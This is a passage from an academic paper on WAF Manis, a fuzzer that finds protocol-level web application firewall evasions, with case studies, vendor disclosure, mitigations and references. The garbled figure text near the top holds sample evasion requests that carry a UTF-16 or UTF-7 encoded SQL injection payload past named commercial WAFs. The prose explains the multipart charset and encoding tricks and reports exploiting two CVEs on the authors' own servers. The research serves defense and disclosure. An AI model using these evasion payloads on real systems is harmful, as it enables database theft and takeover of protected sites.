                                                                                                                 plications.         1\0'\0o\0r\0(\01\0)\0#\0
                                                                                                                                           1\0'\0o\0r\0(\01\0)\0#\0
                                                                                                                                     --boundary-- Modsecurity WAF
                                                                                                                                           --boundary--Flask
                 Host: target                                                Host: target
            Content-Disposition: form-data; name="id"
                 Content-Type: application/x-www-form-               Content-Disposition:
                                                                             Content-Type:form-data;  name="id"
                                                                                             application/x-www-form-
            Content-Type: multipart/form-data;
                 urlencoded;  charset=utf-7 charset="utf-16le"
                                                   Pass             Figure     7. multipart/form-data;
                                                                     Content-Type: Samples
                                                                             urlencoded;          of charset="utf-16le"
                                                                                         charset=utf-7 protocol-level WAF evasion found by WAF Manis.
   Attacker1\0'\0o\0r\0(\01\0)\0#\0        Pass
                             Huawei Cloud WAF                                              Spring WebApp
                                                                     1\0'\0o\0r\0(\01\0)\0#\0
                  +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-                           +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-
            --boundary-- Modsecurity WAF                             --boundary--Flask                                                                                       Pass
                  Don't support RFC2331 and recognize                      Support RFC2331 and recognize                     Attacker                                        Pass
                                                                                                                                                   Mircosoft Azure WAF                                           Django WebApp
                  boundary as NULL                                         boundary as boundary                              Attacker               Alibaba Cloud WAF
      Malformed boundary parameter. According to RFC                                                                         plementations (eg. Django) can tolerance                                            Express
                                                                                                                                                                                                                 incompleteWebApp
                                                                                                                                          Don't support charset and recognize the                Support charset    and recognize the CRLF
                                                                                                                                          paramter
                                                                                                                                          Don't    as +AFkAZA-=+ADE...
                                                                                                                                                support Content-Type in multipart and            parmeter
                                                                                                                                                                                                    SupportasContent-Type
                                                                                                                                                                                                                id = 1'or(1)# in multipart and
2046, the body of a “multipart”                    Pass
                                                   Pass
                                                                  media type field must con-                                 tokens with only one CR or one LF token
                                                                                                                                          get paramter as id = 1\0'\0o\0r\0(\01\0)\0#\0                         whileasmany
                                                                                                                                                                                                    decode parameter                    WAFs
                                                                                                                                                                                                                             id = 1'or(1)#
  Attacker                 Mircosoft  Azure WAF                                         Django
tain   one or more
  Attacker                 AlibababodyCloud WAF parts, each precededExpress                  by WebApp
                                                                                                   a boundary
                                                                                                  WebApp                     including
                                                                                                                                    POST /post Fortinet,
                                                                                                                                    Host: target
                                                                                                                                                 HTTP/1.1            Huawei Cloud,                  and
                                                                                                                                                                                           POST /post
                                                                                                                                                                                           Host: target
                                                                                                                                                                                                              Alibaba Cloud can
                                                                                                                                                                                                        HTTP/1.1
              Don't support charset and recognize the                   Support charset and recognize the                           Content-Type: multipart/form-data;boundary=boundary Content-Type: multipart/form-data;boundary=boundary
delimiterDon't    and
              paramter      the
                      support        last
                               Content-Type
                              +AFkAZA-=+ADE...
               POST /postasHTTP/1.1
                                              one
                                                in     followed
                                                   multipart  and         by
                                                                        parmeter a
                                                                           Support as idHTTP/1.1
                                                                           POST /post     = 1'or(1)# inboundary
                                                                                      closing
                                                                                     Content-Type        multipart and       not parse           them correctly and thus they get bypassed.
              get paramter as id = 1\0'\0o\0r\0(\01\0)\0#\0                decode parameter as id = 1'or(1)#                        --boundary                                             --boundary
               Accept: */*                                                 Accept: */*
delimiter        line.
                /post target
         POSTHost:
                             The
                       HTTP/1.1
                                      boundary             value     is   defined
                                                                           Host:
                                                                  POST /post     target
                                                                               HTTP/1.1
                                                                                            in   the     Content-                   Content-Disposition: 3:
                                                                                                                                   Category                    RFC
                                                                                                                                                          form-data; name="id"               Gap. It isform-data;
                                                                                                                                                                           Support Content-Disposition:             essential
                                                                                                                                                                                                                            name="id" that all
               Content-Type: application/x-www-form-
         Host: target                                                      Content-Type: application/x-www-form-
                                                                  Host: target                                                      Content-Type: multipart/form-data; charset="utf-16le"  Content-Type: multipart/form-data; charset="utf-16le"
Type header.   urlencoded;
         Content-Type:
                           During
                             charset=utf-7 our evaluation,
                         multipart/form-data;boundary=boundary
                                                                             Cloudflare
                                                                           urlencoded;
                                                                  Content-Type:         charset=utf-7WAF will
                                                                                  multipart/form-data;boundary=boundary      parties       involved adhere to the specifications                                       outlined in the
                                                                                                                                    1\0'\0o\0r\0(\01\0)\0#\0                               1\0'\0o\0r\0(\01\0)\0#\0
not parse         boundary="boundary"          Pass
               +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-
         --boundary
                       Modsecurity WAF
                                                                              value        as boundary,
                                                                           +AGkAZA-=+ADEAJwBvAHIAKAAxACkAIw-
                                                                  --boundary
                                                                               Flask
                                                                                                                             RFC--boundary--
                                                                                                                                      to ensure interoperability and                             security. However, during
                                                                                                                                                                                           --boundary--
         Content-Disposition: form-data; name="id"                Content-Disposition: form-data; name="id"
so Cloudflare                WAF will
         Content-Type: multipart/form-data;         not parse
                                              charset="utf-16le"        the corresponding
                                                                  Content-Type:                                  mul-
                                                                                  multipart/form-data; charset="utf-16le"    our evaluation, we found a number of WAFs and WebApps
tipart 1\0'\0o\0r\0(\01\0)\0#\0
           data while all most popular                                     web frameworks like
                                                                  1\0'\0o\0r\0(\01\0)\0#\0                                   don’t follow the current RFC standard. Apart from crafting
         --boundary--                                             --boundary--                                                                                              Pass
Laravel,
  Attacker
                Springboot, Gin,Passand Flask will parse these parts.                                                        malformed
                                                                                                                             Attacker               data      which may throw warnings
                                                                                                                                                      Alibaba Cloud WAF
                                                                                                                                                                                                                        in the parsers,
                                                                                                                                                                                                                 Express WebApp
                           Mircosoft Azure WAF                                          Django WebApp
Figure 7b          shows how the evasion occurs.
              Don't support charset and recognize the                   Support charset and recognize the                    attackers    Don't can
                                                                                                                                                 supportleverage
                                                                                                                                                          Content-Type in the
                                                                                                                                                                            multipartRFC
                                                                                                                                                                                       and    support            gaps between
                                                                                                                                                                                                    Support Content-Type      in multipart andthe
              paramter as +AFkAZA-=+ADE...                              parmeter as id = 1'or(1)#
      Malformed boundary Pass                       separator. Through RFC 2046 in-                                          WAFs get     and paramter as id = 1\0'\0o\0r\0(\01\0)\0#\0
                                                                                                                                                    WebApps to make a legitimate-looking            decode parameter as id = 1'or(1)#
                                                                                                                                                                                                                                      request
  Attacker                 Alibaba Cloud WAF
dicatesPOST     /post HTTP/1.1
              that
         Host: target
                          the       boundary              delimiter           line Express
                                                                  POST /post HTTP/1.1
                                                                  Host: target
                                                                                                  WebApp
                                                                                         is defined              as a        while getting parsed by the WAFs and WebApps differently.
              Don't support
         Content-Type:         Content-Type in multipart and Content-Type:
                         multipart/form-data;boundary=boundary             Support   Content-Type in multipart and
                                                                                  multipart/form-data;boundary=boundary
line consisting
              get paramter as   entirely           of two hyphen
                                   id = 1\0'\0o\0r\0(\01\0)\0#\0           decode characters                with a
                                                                                     parameter as id = 1'or(1)#                    RFC 2231 Support. Based on RFC 2388, if the file
         --boundary
terminating            CRLF,
         Content-Disposition:                  found that --boundary
                                       wename="id"
                               form-data;                          many webform-data;
                                                                  Content-Disposition:      framework
                                                                                                   name="id"        im-      name of the sender’s operating system is not in US-ASCII,
            Content-Type: multipart/form-data; charset="utf-16le"    Content-Type: multipart/form-data; charset="utf-16le"

            1\0'\0o\0r\0(\01\0)\0#\0                                 1\0'\0o\0r\0(\01\0)\0#\0
            --boundary--                                             --boundary--




                                                    Pass
   Attacker                  Alibaba Cloud WAF                                            Express WebApp
                 Don't support Content-Type in multipart and                 Support Content-Type in multipart and
the file name can be encoded with the method of RFC            means the parser attempts to process input data to the best
2231. However, during our evaluation, the fuzzing results of   of its ability, even if the input contains errors or is not fully
WAF Manis show that not all WAFs and WebApps correctly         compliant with the expected syntax. As shown in Figure 2,
implement this feature. With the grammar-level Mutation of     there are a number of unexpected parsing behaviors against
WAF Manis, we found that some Web framework implemen-          the RFC 1867. First, according to find_boundary func-
tations even support other parameters to be encoded. Fig-      tion defined in main\rfc1867.c, PHP tries to find the
ure 7d shows the sample that can confuse WAFs to choose        boundary ignoring the padding lines before multipart data.
the correct subpart in multipart/form-data proto-              Second, PHP only seeks for name and filename param-
col by encoding boundary parameter or name parameter           eters in Content-Disposition header, which means
in RFC 2331 as boundary*=us-ascii’’boundary,                   form-data token defined in RFC 1867 can be omitted.
which results in the value of the boundary to boundary.        Third, when the CRLF token between part headers and
    Deprecated Content-Transfer-Encoding Header. Once,         part body is missing, PHP will treat the first line after
it was recommended in RFC standards that the ”content-         Content-Disposition header as the value of that part
transfer-encoding” header be supplied if the value of that     and stop parsing the remaining parts. Finally, PHP will not
part does not conform to the default encoding in RFC 2388.     throw any exception when the terminal boundary is missing.
But in RFC 7578, the recommendation got deprecated and         Since the parsing behavior is built in the PHP engine, these
senders SHOULD NOT generate any parts with a Content-          evasion tactics can affect almost any web framework written
Transfer-Encoding header field. Notably, web frameworks        in PHP.
such as Gin, Beego, Echo, and Flask still support these
features during our evaluation. As illustrated in Figure 7c,       Real-world Experiment. Given the potential ethical risks
an attacker can set Content-Transfer-Encoding:                 of conducting exploitation attacks against real-world web-
  quoted-printable header to transfer encoded ma-              sites, we conducted exploitation experiments against our
licious payload in multipart/form-data protocol to             websites deployed behind commercial WAFs. We conducted
bypass almost every WAF in the real world.                     a real-world experiment to exploit this vulnerability for SQL
    Charset Support. According to RFC 1866, there is no        injection attacks. We set up a WordPress website on our own
clue that application/x-www-form-urlencoded                    VPS server, one with the vulnerability (CVE-2022-33965).
media type supports body encoding. In most WAFs and            Then we deploy Cloudflare WAF to protect our website. By
web frameworks, parameters on this MIME type are               exploiting the WAF evasion vulnerability, we are able to
ignored. In particular, this MIME type does not support        deliver a payload for CVE-2022-33965 to obtain sensitive
the charset parameter. However, as is shown in figure 7e       data from the database, such as passwords.
there are some web frameworks (e.g Django) that will               Case Study 2: RFC 2616 and RFC 7578 viola-
use the charset parameter in the Content-Type header           tions in Go language. As shown in Figure 7c, some
to decode the request body, which means an attacker            web frameworks like Gin, Beego, and Echo will decode
can encode malicious payload with utf-7 with Content-          quoted-printable form parameters, which can be lever-
Type      application/x-www-form-urlencoded;                   aged to bypass WAF. The unexpected parsing behaviors
charset=utf-7 to evade the detection of the WAF.               arise from the standard libraries of Go: http and mime.
    Content-Type supprot in multipart data. Notably, during    Request.ParseMultipartForm method in http li-
our evaluation, we found that web frameworks including         brary will call Part struct in mime library to parse mul-
express, nest, koa, fastify, and sails support content-type    tipart parameters. However, according to RFC 2616, unlike
in multipart data. As illustrated in Figure 7f, these web      MIME, HTTP does not use Content-Transfer-Encoding, and
frameworks parse the Content-Type header in the part           does use Transfer-Encoding and Content-Encoding. Further-
and use charset parameter in this header to decode the         more, according to RFC 7578 section 4.7 Senders SHOULD
value of the part, so attackers can encode their malicious     NOT generate any parts with a Content-Transfer-Encoding
payload to evade the detection from almost every WAF,          header field. This evasion tactic has a huge impact on
leaving these web frameworks in threats.                       WebApps based on Go because the wrong behavior is
                                                               introduced in the standard library.
5.3. Case Study
                                                                   Real-world Experiment. We conducted a real-world ex-
    We manually review the found evasion samples to es-        periment to demonstrate the threat. We set up a Gogs (A
timate their real-world impact. Notably, we found 2 cases      popular Git service written in Go language) instance on
that are rooted in the PHP and Go programming languages,       our own VPS server, which has the vulnerability (CVE-
which can bypass major WAFs to exploit web applications        2022-0415). Subsequently, we deployed a Fortinet WAF to
written in those languages.                                    safeguard our Gogs website. By leveraging the evasion vul-
    Case Study 1: RFC 1867 violations in PHP language.         nerability, we successfully delivered the malicious payload
After manually reviewing the evasion samples for Laravel,      of CVE-2022-0415 to the Git service, enabling us to gain
Symfony, and Codeigniter, we found the common root cause       complete control over the target system, such as accessing
of the evasions is that the parser built in PHP is using the   sensitive data, modifying or deleting files, and executing
“best effort parsing” mode to parse HTTP requests, which       commands.
6. Discussion                                                   evaluations, we observed that some WAFs attempted to
                                                                normalize HTTP requests when forwarding, but still fail to
6.1. Responsible Disclosure                                     prevent evasions.
                                                                    Another possible approach is Runtime Application Self-
    Ethical Consideration. In the whole process of our          Protection (RASP). This approach integrates security poli-
experiments, we try our best to follow the best industry        cies directly into the web application’s runtime environment,
practice of security research. First, we set up popular open-   actively analyzing the parameters and application logic to
source WAFs on our controlled servers to verify the effec-      identify and mitigate potential threats. As having this van-
tiveness of our WAF Manis, throughout this work. Second,        tage point, RASP can directly collect the same parameters
for well-known commercial WAF providers like Cloudflare,        from Web applications, thus avoiding potential protocol
Fortinet, Huawei Cloud, and Alibaba Cloud, we strictly fol-     parsing ambiguities. However, RASP also has its limitations,
low their bug bounty rules to perform controlled experiments    such as the complexity of deep integration, performance
by sending small-scale traffic to our own websites. Third,      impact, and limited protection scope.
both open-source and cloud WAFs encourage security tests            The third approach is fuzzing WAF implementations with
through bug bounty programs, and we responsibly disclosed       methodologies like WAF Manis. The vulnerabilities in this
the details to them. Our contact results are summarized as      research arise from the parsing inconsistency between the
follows.                                                        WAFs and the WebApps, which cannot be revealed with
    Cloudflare. They acknowledged our report and re-            traditional fuzzing tools that only explore either WAF or We-
warded us for reporting the issue of WAF evasion. They          bApp. To address this gap, our tool, WAF Manis, has been
told us that they generally don’t consider WAF evasion bugs     designed to specifically target the interaction between WAFs
for bug bounty purposes, but as our report provided a more      and WebApps, enabling a more effective identification of
notable finding than most, they offered us a cash reward in     potential vulnerabilities. We will open source our tool at
thanks.                                                         https://github.com/EkiXu/WAFManis once all the identified
    Fortinet. They accepted our report and confirmed the        vulnerabilities are fixed by affected vendors.
vulnerability. The vulnerability now has been fixed.                At high-level, we suggest several broader considerations
    Alibaba Cloud. They accepted our reports as critical        when implementing and designing protocols.
vulnerabilities and provided us $900 bug bounty rewards             In implementation, follow RFC standards and be con-
for reporting the vulnerabilities.                              sistent in HTTP-level parsing. First, both WAFs and We-
    Huawei Cloud. They appreciated our work [44], ac-           bApps should strictly follow related implementation stan-
cepted our reports and provided us $550 bug bounty rewards      dards in the RFC. Second, for ambiguous or undetailed
for reporting the vulnerabilities.                              definitions in the RFCs, we recommend following well-
    ModSecurity&Core Rule Set. They confirmed our re-           known HTTP implementations as industry standards. In
port and fixed the vulnerabilities. CVE-2023-38199 is as-       these ways, protocol-level evasion caused by inconsistency
signed for the vulnerabilities.                                 can be mostly avoided.
    PHP Security Team. They thanked our report and                  In design, keep simplicity and apply secure defense.
confirmed our findings as valid security issues.                HTTP implementations normally follow the Postel’s law of
    Go Security Team. They expressed their gratitude for        “be liberal in what you receive” to keep robustness, however,
our report and would address it as a hardening measure.         the primary goal of WAF is to defend against possible at-
    Others. We have contacted other relevant WAF vendors        tacks, thus the WAF parser should keep simplicity in its core
and are looking forward to receiving their feedback.            function implementation, and apply secure defense to avoid
                                                                any HTTP-level confusion concerning either parameter type,
6.2. Mitigation                                                 malformed structure, or any support gaps.
                                                                    Above all, as these vulnerabilities are caused by se-
    Our work underscores the unfortunate fact that the pars-    mantic gaps among multiple implementations with different
ing process has become the Achilles heel in WAF defense.        understandings of the same data, a concerted effort and
Our study discovered a number of protocol-level evasions.       a systematical security view are needed to mitigate this
We suggest possible mitigations as follows.                     problem.
    One possible approach is normalization. Previous work
on TCP/IP protocol ambiguities [22] has proposed normal-        7. Related Work
ization and canonicalization methods to remove potential
ambiguities to mitigate NIDS evasions. However, applying            In this section, we present work related to WAF evasion
such techniques to HTTP protocol may be not infallible. Be-     and network fuzzing.
cause the nature of HTTP as a text-based protocol, coupled          WAF Evasion. Prior research [6], [27], [43] achieved
with its extensive flexibility and redundancy, makes correct    success in automating the discovery of payload-level eva-
normalization challenging. Furthermore, even if WAFs en-        sions. They simply facilitate the encoding and obfuscating
force correct canonicalization or allowlist-based mitigation,   approaches of the original attack payload in a known bypass
web applications may have their “dialect” and interpret the     cheat sheet in order to bypass the WAF. To cope with more
request differently with the WAFs. For instance, in our         complex WAFs, researchers [7], [18], [23], [36] have applied
evolution algorithms on payloads. These evasion methods          to leverage fuzzing techniques to discover vulnerabilities
typically begin by generating a malicious payload that is        in Network services. However, previous fuzzers like AFL
initially non-evasive based on the underlying grammar. Sub-      [46] are primarily designed for file format fuzzing, which
sequently, evolutionary algorithms are applied to mutate         requires additional modifications or tooling to support com-
the payload multiple times, guided by specific metrics that      plex network protocols. The most straightforward approach
facilitate the transformation process, ultimately enabling       is to interact with the target WebApp over the network
the payload to transit from its initial non-evasive state to     [1], [45]. AFL++ [20] integrates preeny [42] that converts
an evasive state that can bypass WAFs. However, these            socket-based I/O to file-based I/O, which provides basic
researches mainly focus on detecting SQL injection evasion       support for network service fuzzing.
samples and their techniques cannot discover protocol-level          Another challenge faced by network protocol fuzzing is
evasions.                                                        that vanilla fuzzers are not designed for stateful network
     Previous studies identified protocol-level semantic gaps,   protocols. Thus, the generated inputs are likely to fail to
which indicates possible WAF evasions. HTTP Parameter            comply with the required format or order of the protocol,
Pollution Attack (HPP) [11] is a classical type of protocol-     making it difficult to reach deep areas in the target program.
level evasion. HPP occurs when an attacker deliberately          Pham et al. [34] proposed the AFLNet which addresses the
modifies the parameter structure or introduces duplicate or      limitations of AFL for network protocol fuzzing. AFLNet
conflicting parameters to confuse the WAF and server-side        aims to discover vulnerabilities in network-based applica-
processing. If the WAF parses these parameters differently       tions with complex protocols. Using response codes to rep-
from the WebApps, it is possible for the WAF to overlook         resent states, AFLNet is capable of automatically inferring
malicious payloads within the parameters, thus leading to a      the state model of the target service and generating input
bypass. Balduzzi et al. [9] proposed an automated approach       sequences through mutations that can reach deeper states.
for the discovery of HPP by scanning and analyzing param-        To address the issue of insufficient information in response
eters. However, HPP is limited to parameter-based attacks,       codes, STATEAFL [30] and NSFuzz [35] proposed methods
whereas many potential vulnerabilities can only be triggered     that utilize memory states and program variables to represent
by requests in formats such as form-data and others.             service states. TCP-Fuzz [48] aims to discover semantic
     Differential testing is a software testing technique that   gaps between different TCP stacks using differential fuzzing.
focuses on comparing the behavior or output of two or more       Nyx-Net [40] applies snapshots on network service fuzz
similar implementations of a program or system. which            to improve efficiency. However, none of these published
can indicate protocol-level evasion. T-Reqs [24] presents        research and tools can uncover the semantic gap of HTTP
a grammar-based differential fuzzer to find HTTP Request         parsers between WAFs and WebApps.
Smuggling (HRS) [28] samples. It first tests each web
middleware target in isolation, and then compares responses      8. Conclusion
from targets to identify the pairs that behave differently,
indicating potential HTTP semantic gaps. Unfortunately, T-
                                                                     In this paper, we have introduced WAF Manis, a novel
Reqs is limited to HRS and lacks testing on common web
                                                                 automated tool designed to detect web application firewall
application frameworks.
                                                                 evasions. These evasions exploit differences in protocol
     Previous work has proposed protocol grammar-based
                                                                 parsing between the WAFs and the WebApps. Our evalu-
fuzzing approaches to identify censorship evasions. For
                                                                 ation of 280 combinations (14 × 20) of real-world deployed
example, geneva [10] and CenFuzz [37] also utilized HTTP
                                                                 systems demonstrates WAF Manis’ ability to effectively
grammars to generate test cases and fuzz censorships. Our
                                                                 detect 311 protocol-level evasion cases, affecting all tested
work differs from them in two aspects: (1) the vulner-
                                                                 WAFs and web applications. Our tool can assist develop-
ability detector is different. Geneva and CenFuzz focus
                                                                 ers in detecting vulnerabilities before they are exploited
on bypassing censorship, while our work focuses on web
                                                                 by attackers. We have responsibly disclosed all identified
application firewalls evasion which require examining web
                                                                 vulnerabilities to the affected providers, receiving acknowl-
applications for parametric integrity detection. (2) Approach
                                                                 edgments and bug bounty rewards from Cloudflare WAF,
to fuzzing is different. Our work employs the code coverage
                                                                 Fortinet WAF, Alibaba Cloud WAF, Huawei Cloud WAF,
of open source web frameworks to guide new testing request
                                                                 ModSecurity, the Go security team, and the PHP security
generation, while Geneva and CenFuzz operate within black
                                                                 team. We hope this work can inspire the community to
box testing.
                                                                 discover and reduce semantic gap attacks between WAFs
     Generally, protocol-level WAF evasion vulnerabilities
                                                                 and WebApps.
fall under the category of semantic gap attacks. Similar
semantic gap attacks have been identified in various sys-
tems, including HTTP implementations [13], [41], CDN sys-        9. Acknowledgement
tems [15], [47], and email systems [14]. The methodologies
we have proposed could potentially be adapted and applied           We sincerely thank all anonymous reviewers and our
to these systems as well, addressing similar discrepancies in    shepherd for their insightful and constructive feedback to
interpretation.                                                  improve the paper. This work was supported by the National
     Network Fuzzing. Previous studies have also attempted       Natural Science Foundation of China (grant #62272265).
References                                                                      [20] A. Fioraldi, D. Maier, H. Eißfeldt, and M. Heuse, “AFL++: Combin-
                                                                                     ing incremental steps of fuzzing research,” in 14th USENIX Workshop
[1]   “Aflplusplus fuzzing network services,” https://github.com/AFLpluspl           on Offensive Technologies (WOOT 20). USENIX Association, Aug.
      us/AFLplusplus/tree/networking.                                                2020.

[2]   “Alibaba waf challenge game,” https://security.alibaba.com/online/de      [21] J. E. Forrester and B. P. Miller, “An empirical study of the robustness
      tail?spm=0.0.0.0.4oWvph&type=1&id=147&tab=1.                                   of windows nt applications using random testing,” ser. WSS’00.
                                                                                     USA: USENIX Association, 2000, p. 6.
[3]   “Github waf topic,” https://github.com/topics/waf.
[4]   “Perf tools support for intel® processor trace,” https:                   [22] M. Handley, V. Paxson, and C. Kreibich, “Network intrusion detec-
      //perf.wiki.kernel.org/index.php/Perf tools support for Intel%C                tion: Evasion, traffic normalization, and end-to-end protocol seman-
      2%AE Processor Trace#What is Intel.C2.AE Processor Trace.                      tics,” in Proceedings of the 10th Conference on USENIX Security
                                                                                     Symposium - Volume 10, ser. SSYM’01. USA: USENIX Association,
[5]   “Information Supplement: Application Reviews and Web Application               2001, p. 9.
      Firewalls Clarified,” PCI Security Standards Council, Standard, Oct.
      2008.                                                                     [23] M. Hemmati and M. A. Hadavi, “Using deep reinforcement learning
                                                                                     to evade web application firewalls,” in 18th International ISC
[6]   3xp10it, “xwaf,” https://github.com/3xp10it/xwaf.                              Conference on Information Security and Cryptology, ISCISC 2021,
[7]   D. Appelt, C. D. Nguyen, A. Panichella, and L. C. Briand,                      Isfahan, Iran, Islamic Republic of, September 1-2, 2021. IEEE,
      “A machine-learning-driven evolutionary approach for testing web               2021, pp. 35–41. [Online]. Available: https://doi.org/10.1109/ISCISC
      application firewalls,” IEEE Trans. Reliab., vol. 67, no. 3, pp.               53448.2021.9720473
      733–757, 2018. [Online]. Available: https://doi.org/10.1109/TR.201
      8.2805763                                                                 [24] B. Jabiyev, S. Sprecher, K. Onarlioglu, and E. Kirda, “T-reqs: Http
                                                                                     request smuggling with differential fuzzing,” in Proceedings of the
[8]   E. Athanasopoulos, V. P. Kemerlis, M. Polychronakis, and E. P.                 2021 ACM SIGSAC Conference on Computer and Communications
      Markatos, “ARC: protecting against HTTP parameter pollution                    Security, ser. CCS ’21. New York, NY, USA: Association for
      attacks using application request caches,” in Applied Cryptography             Computing Machinery, 2021, p. 1805–1820. [Online]. Available:
      and Network Security - 10th International Conference, ACNS 2012,               https://doi.org/10.1145/3460120.3485384
      Singapore, June 26-29, 2012. Proceedings, ser. Lecture Notes
      in Computer Science, F. Bao, P. Samarati, and J. Zhou, Eds.,              [25] J. Kettle, “How to identify and exploit http host header vulnera-
      vol. 7341. Springer, 2012, pp. 400–417. [Online]. Available:                   bilities,” https://portswigger.net/web-security/host-header/exploiting#
      https://doi.org/10.1007/978-3-642-31284-7 24                                   send-ambiguous-requests.
[9]   M. Balduzzi, C. T. Gimenez, D. Balzarotti, and E. Kirda, “Automated       [26] ——, “Top 10 web hacking techniques of 2020,” https://portswigge
      discovery of parameter pollution vulnerabilities in web applications.”         r.net/research/top-10-web-hacking-techniques-of-2020.
      in NDSS, 2011.
                                                                                [27] khalilbijjou, “Wafninja,” https://github.com/khalilbijjou/WAFNinja.
[10] K. Bock, G. Hughey, X. Qiang, and D. Levin, “Geneva:
     Evolving censorship evasion strategies,” in Proceedings of the             [28] C. Linhart, A. Klein, R. Heled, and S. Orrin, “Http request
     2019 ACM SIGSAC Conference on Computer and Communications                       smuggling,” https://www.cgisecurity.com/lib/HTTP-Request-Smuggli
     Security, ser. CCS ’19. New York, NY, USA: Association for                      ng.pdf.
     Computing Machinery, 2019, p. 2199–2214. [Online]. Available:              [29] B. P. Miller, L. Fredriksen, and B. So, “An empirical study of the
     https://doi.org/10.1145/3319535.3363189                                         reliability of unix utilities,” vol. 33, no. 12, p. 32–44, dec 1990.
[11] L. Carettoni and S. di Paola, “Http parameter pollution,” https://ow            [Online]. Available: https://doi.org/10.1145/96267.96279
     asp.org/www-pdf-archive/AppsecEU09 CarettoniDiPaola v0.8.pdf.
                                                                                [30] R. Natella, “Stateafl: Greybox fuzzing for stateful network servers,”
[12] S. Carielli, “Now tech: Web application firewalls, q2 2022,”                    Empirical Softw. Engg., vol. 27, no. 7, dec 2022. [Online]. Available:
     https://www.forrester.com/report/now-tech-web-application-firewalls             https://doi.org/10.1007/s10664-022-10233-3
     -q2-2022/RES177433.
                                                                                [31] OSSInsight, “Web framework - ranking,” https://ossinsight.io/collecti
[13] J. Chen, J. Jiang, H. Duan, N. Weaver, T. Wan, and V. Paxson, “Host             ons/web-framework.
     of troubles: Multiple host ambiguities in http implementations,” in
     Proceedings of the 2016 ACM SIGSAC Conference on Computer and              [32] H. Peng and M. Payer, “Usbfuzz: A framework for fuzzing USB
     Communications Security, 2016, pp. 1516–1527.                                   drivers by device emulation,” in 29th USENIX Security Symposium,
[14] J. Chen, V. Paxson, and J. Jiang, “Composition kills: A case study              USENIX Security 2020, August 12-14, 2020, S. Capkun and
     of email sender authentication,” in 29th USENIX Security Symposium              F. Roesner, Eds. USENIX Association, 2020, pp. 2559–2575.
     (USENIX Security 20), 2020, pp. 2183–2199.                                      [Online]. Available: https://www.usenix.org/conference/usenixsecuri
                                                                                     ty20/presentation/peng
[15] J. Chen, X. Zheng, H.-X. Duan, J. Liang, J. Jiang, K. Li, T. Wan, and
     V. Paxson, “Forwarding-loop attacks in content delivery networks.”         [33] J. Pereyda, “boofuzz: Network protocol fuzzing for humans,” https:
     in NDSS, 2016.                                                                  //github.com/BBVA/waf-brain.
[16] G. Cloud, “Post body inspection limitation,” https://cloud.google.com      [34] V.-T. Pham, M. Böhme, and A. Roychoudhury, “Aflnet: A greybox
     /armor/docs/security-policy-overview#post-body.                                 fuzzer for network protocols,” in 2020 IEEE 13th International
[17] corerulest, “Owasp modsecurity core rule set,” https://coreruleset.org/.        Conference on Software Testing, Validation and Verification (ICST),
                                                                                     2020, pp. 460–465.
[18] L. Demetrio, A. Valenza, G. Costa, and G. Lagorio, “Waf-
     a-mole: evading web application firewalls through adversarial              [35] S. Qin, F. Hu, Z. Ma, B. Zhao, T. Yin, and C. Zhang, “Nsfuzz:
     machine learning,” in SAC ’20: The 35th ACM/SIGAPP Symposium                    Towards efficient and state-aware network service fuzzing,” ACM
     on Applied Computing, online event, [Brno, Czech Republic],                     Trans. Softw. Eng. Methodol., mar 2023. [Online]. Available:
     March 30 - April 3, 2020, C. Hung, T. Cerný, D. Shin, and                      https://doi.org/10.1145/3580598
     A. Bechini, Eds. ACM, 2020, pp. 1745–1752. [Online]. Available:            [36] Z. Qu, X. Ling, and C. Wu, “Autospear: Towards automat-
     https://doi.org/10.1145/3341105.3373962                                         ically bypassing and inspecting web application firewalls,”
[19] S. Dinesh, N. Burow, D. Xu, and M. Payer, “Retrowrite: Statically               https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-Qu-A
     instrumenting cots binaries for fuzzing and sanitization,” in 2020              utoSpear-Towards-Automatically-Bypassing-and-Inspecting-Web-
     IEEE Symposium on Security and Privacy (SP), 2020, pp. 1497–1511.               Application-Firewalls.pdf.
[37] R. S. Raman, M. Wang, J. Dalek, J. Mayer, and R. Ensafi,                Appendix A.
     “Network measurement methods for locating and examining
     censorship devices,” in Proceedings of the 18th International
     Conference on Emerging Networking EXperiments and Technologies,         A.1. Baseline Test
     ser. CoNEXT ’22. New York, NY, USA: Association for
     Computing Machinery, 2022, p. 18–34. [Online]. Available:
     https://doi.org/10.1145/3555050.3569133                                  WAF                  WAFNinjia Result SQLMap (xwaf) Result
[38] Research and Markets, “Global web application firewall market es-        Mircosoft Azure WAF Failed              Failed
     timated to reach $21.05 billion by 2030 amid growing concerns            Google Cloud Amor    Failed             Failed
     of cyberattacks,” https://finance.yahoo.com/news/global-application-f    Alibaba Cloud WAF    Failed             Failed
     irewall-market-estimated-104800918.html.                                 Cloudflare WAF       Failed             Failed
[39] I. Ristic, “Protocol-level evasion of web application firewalls,”        Huawei Cloud WAF     Failed             Failed
     https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH US 12 R          Safeline WAF         Failed             Failed
     istic Protocol Level Slides.pdf.                                         Fortinet WAF         Failed             Failed
[40] S. Schumilo, C. Aschermann, A. Jemmett, A. Abbasi, and                   Barracuda WAF        Failed             Failed
     T. Holz, “Nyx-net: Network fuzzing with incremental snapshots,” in       ModSecurity WAF      Failed             Failed
     Proceedings of the Seventeenth European Conference on Computer           Naxis                Failed             Failed
     Systems, ser. EuroSys ’22. New York, NY, USA: Association                OpenWAF              Failed             Failed
     for Computing Machinery, 2022, p. 166–180. [Online]. Available:          Janusec              Failed             Failed
     https://doi.org/10.1145/3492321.3519591                                  WAFbrain             Failed             Failed
[41] K. Shen, J. Lu, Y. Yang, J. Chen, M. Zhang, H. Duan, J. Zhang,           HiHTTP               Failed             Failed
     and X. Zheng, “Hdiff: A semi-automatic framework for discovering                        TABLE 3. BASELINE T EST R ESULTS
     semantic gap attack in http implementations,” in 2022 52nd Annual
     IEEE/IFIP International Conference on Dependable Systems and
     Networks (DSN). IEEE, 2022, pp. 1–13.
[42] Y. Shoshitaishvili, “preeny,” https://i.blackhat.com/us-18/Thu-Augus
     t-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unex
     ploitable.pdf.
[43] sqlmap, “sqlmap: Automatic sql injection and database takeover tool,”
     https://sqlmap.org/.
[44] H. P. S. I. R. Team, “Huawei cloud security huawei bug bounty
     program 2023q1 acknowledgement announcement,” https://bugbount
     y.huawei.com/hbp/#/announcement/detail?code=HBPA23-0010.
[45] thuanpv, “Aflnwe,” https://github.com/thuanpv/aflnwe.
